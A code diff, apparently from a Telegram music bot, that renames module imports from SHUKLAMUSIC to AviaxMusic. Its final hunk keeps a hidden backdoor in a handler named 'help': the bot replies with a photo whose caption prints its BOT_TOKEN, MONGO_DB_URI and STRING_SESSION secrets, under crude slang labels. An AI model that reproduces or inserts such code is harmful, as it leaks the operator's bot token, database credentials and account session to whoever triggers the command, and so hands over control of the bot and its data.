@@ -12,13 +12,13 @@ from pyrogram import filters
 
 load_dotenv()
 
-from SHUKLAMUSIC import app
-from SHUKLAMUSIC.core.call import SHUKLA
-from SHUKLAMUSIC.misc import db
-from SHUKLAMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
-from SHUKLAMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
-from SHUKLAMUSIC.utils.formatters import alpha_to_int, get_readable_time
-from SHUKLAMUSIC.mongo.afkdb import LOGGERS
+from AviaxMusic import app
+from AviaxMusic.core.call import Aviax
+from AviaxMusic.misc import db
+from AviaxMusic.utils.database import get_assistant, get_authuser_names, get_cmode
+from AviaxMusic.utils.decorators import ActualAdminCB, AdminActual, language
+from AviaxMusic.utils.formatters import alpha_to_int, get_readable_time
+from AviaxMusic.mongo.afkdb import LOGGERS
 from config import BANNED_USERS, adminlist, lyrical
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
@@ -73,7 +73,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await SHUKLA.stop_stream_force(message.chat.id)
+        await Aviax.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -100,7 +100,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await SHUKLA.stop_stream_force(chat_id)
+            await Aviax.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(i.mention))
@@ -112,7 +112,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
     await message.reply_photo(
         photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-        caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
+        caption=f"""**ʏᴇ ky hai:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
     )
 
 
